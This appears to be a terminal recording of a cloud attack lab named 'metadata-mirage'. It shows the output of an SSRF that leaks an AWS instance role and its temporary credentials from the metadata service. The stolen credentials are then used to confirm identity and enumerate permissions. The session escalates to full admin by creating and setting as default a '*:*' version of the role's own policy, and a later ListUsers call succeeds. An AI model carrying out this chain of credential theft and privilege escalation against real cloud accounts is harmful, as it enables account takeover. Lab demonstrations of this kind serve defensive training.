[0.338, "o", "\u001b[?2004l\r\r\n"]
[2.465, "o", "\r\n=== 1. SSRF -> leak the instance role name from IMDS ===\r\n"]
[0.207, "o", "leaked role: metadata-mirage-instance-role\r\n\r\n"]
[0.000, "o", "=== 2. SSRF -> steal the role's temporary credentials ===\r\n"]
[0.206, "o", "{\r\n  \"Code\" : \"Success\",\r\n  \"LastUpdated\" : \"2026-08-11T06:02:56Z\",\r\n  \"Type\" : \"AWS-HMAC\",\r\n  \"AccessKeyId\" : \"ASIAXXXXXXXXXXXXXXXX\",\r\n  \"SecretAccessKey\" : \"REDACTED_SECRET_ACCESS_KEY\",\r\n  \"Token\" : \"REDACTED_SESSION_TOKEN"]
[0.000, "o", "\",\r\n  \"Expiration\" : \"2026-08-11T12:36:58Z\"\r\n}\r\n"]
[0.029, "o", "\r\n=== 3. Pivot -> confirm who we are with the stolen creds ===\r\n"]
[1.236, "o", "\u001b[?1h\u001b=\r{\u001b[m\r\n    \"UserId\": \"AROAZBRL45J7USPVO36VH:i-0ed898df34e38de85\",\u001b[m\r\n    \"Account\": \"621788588671\",\u001b[m\r\n    \"Arn\": \"arn:aws:sts::621788588671:assumed-role/metadata-mirage-instance-role/i-0ed898df34e38de85\"\u001b[m\r\n}\u001b[m\r\n"]
[0.000, "o", "\r\u001b[K\u001b[?1l\u001b>"]
[0.107, "o", "\r\n=== 4. Enumerate -> what is this role allowed to do? ===\r\n"]
[1.028, "o", "\r\naws: [ERROR]: An error occurred (AccessDenied) when calling the ListAttachedRolePolicies operation: User: arn:aws:sts::621788588671:assumed-role/metadata-mirage-instance-role/i-0ed898df34e38de85 is not authorized to perform: iam:ListAttachedRolePolicies on resource: role metadata-mirage-instance-role because no identity-based policy allows the iam:ListAttachedRolePolicies action\r\n\r\nAdditional error details:\r\nType: Sender\r\n"]
[0.111, "o", "--- current (default) version of the app policy ---\r\n"]
[0.928, "o", "\r\naws: [ERROR]: An error occurred (AccessDenied) when calling the GetPolicy operation: User: arn:aws:sts::621788588671:assumed-role/metadata-mirage-instance-role/i-0ed898df34e38de85 is not authorized to perform: iam:GetPolicy on resource: policy arn:aws:iam::621788588671:policy/metadata-mirage-app-policy because no identity-based policy allows the iam:GetPolicy action\r\n\r\nAdditional error details:\r\nType: Sender\r\n"]
[1.034, "o", "\r\naws: [ERROR]: An error occurred (ValidationError) when calling the GetPolicyVersion operation: 1 validation error detected: Value at 'versionId' failed to satisfy constraint: Member must satisfy regular expression pattern: v[1-9][0-9]*(\\.[A-Za-z0-9-]*)?\r\n\r\nAdditional error details:\r\nType: Sender\r\n"]
[0.114, "o", ">> Note: the role can CreatePolicyVersion + SetDefaultPolicyVersion on its OWN policy.\r\n\r\n"]
[0.000, "o", "=== 5. Boundary check BEFORE privesc (expected: AccessDenied) ===\r\n"]
[0.939, "o", "\r\naws: [ERROR]: An error occurred (AccessDenied) when calling the ListUsers operation: User: arn:aws:sts::621788588671:assumed-role/metadata-mirage-instance-role/i-0ed898df34e38de85 is not authorized to perform: iam:ListUsers on resource: arn:aws:iam::621788588671:user/ because no identity-based policy allows the iam:ListUsers action\r\n\r\nAdditional error details:\r\nType: Sender\r\n"]
[0.099, "o", "(denied, as expected - not admin yet)\r\n"]
[0.000, "o", "\r\n"]
[0.000, "o", "=== 6. PRIVESC -> overwrite our own attached policy with *:* and set it default ===\r\n"]
[1.034, "o", "\u001b[?1h\u001b=\r{\u001b[m\r\n    \"PolicyVersion\": {\u001b[m\r\n        \"VersionId\": \"v2\",\u001b[m\r\n        \"IsDefaultVersion\": true,\u001b[m\r\n        \"CreateDate\": \"2026-08-11T06:05:54+00:00\"\u001b[m\r\n    }\u001b[m\r\n}\u001b[m\r\n"]
[0.000, "o", "\r\u001b[K\u001b[?1l\u001b>"]
[0.123, "o", "waiting for policy propagation...\r\n"]
[10.011, "o", "\r\n=== 7. Boundary check AFTER privesc (expected: now allowed = full admin) ===\r\n"]
[0.996, "o", "\u001b[?1h\u001b=\r"]
[0.000, "o", "{\u001b[m\r\n    \"Users\": [\u001b[m\r\n        {\u001b[m\r\n            \"Path\": \"/\",\u001b[m\r\n            \"UserName\": \"lab-admin\",\u001b[m\r\n            \"UserId\": \"AIDAZBRL45J742MEPAYKN\",\u001b[m\r\n            \"Arn\": \"arn:aws:iam::621788588671:user/lab-admin\",\u001b[m\r\n            \"CreateDate\": \"2026-07-16T04:43:38+00:00\",\u001b[m\r\n            \"PasswordLastUsed\": \"2026-07-19T19:17:29+00:00\"\u001b[m\r\n        }\u001b[m\r\n    ]\u001b[m\r\n}\u001b[m\r\n"]
[0.000, "o", "\r\u001b[K\u001b[?1l\u001b>"]
[0.116, "o", "\r\n=== DONE ===\r\n"]
